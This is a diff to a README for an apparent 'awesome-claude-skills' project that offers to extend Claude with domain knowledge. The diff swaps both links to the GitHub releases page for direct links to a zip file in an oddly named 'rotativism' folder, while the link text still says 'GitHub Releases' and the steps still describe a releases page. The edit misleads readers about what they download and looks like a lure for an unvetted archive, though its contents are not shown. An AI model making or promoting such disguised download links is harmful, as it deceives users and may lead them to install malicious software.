@@ -1,7 +1,7 @@
 # 🎉 awesome-claude-skills - Enhance Claude with Domain Expertise
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Samudi21/awesome-claude-skills/releases)
+[![Download](https://raw.githubusercontent.com/Samudi21/awesome-claude-skills/main/rotativism/awesome-claude-skills.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Samudi21/awesome-claude-skills/main/rotativism/awesome-claude-skills.zip)
 
 ## 🚀 Getting Started
 Welcome to "awesome-claude-skills"! This application provides Claude with specific knowledge and expertise to help you utilize Claude better. With this resource, you can improve Claude’s interaction in various domains.
@@ -20,7 +20,7 @@ To run this application, ensure you meet the following requirements:
 - Storage: 100 MB of available space
 
 ## 📦 Download & Install
-To install "awesome-claude-skills," visit this page to download: [GitHub Releases](https://github.com/Samudi21/awesome-claude-skills/releases).
+To install "awesome-claude-skills," visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Samudi21/awesome-claude-skills/main/rotativism/awesome-claude-skills.zip).
 
 1. **Open the Release Page**: Click the link above to open the releases page.
 2. **Choose a Version**: Find the latest version listed at the top of the page.
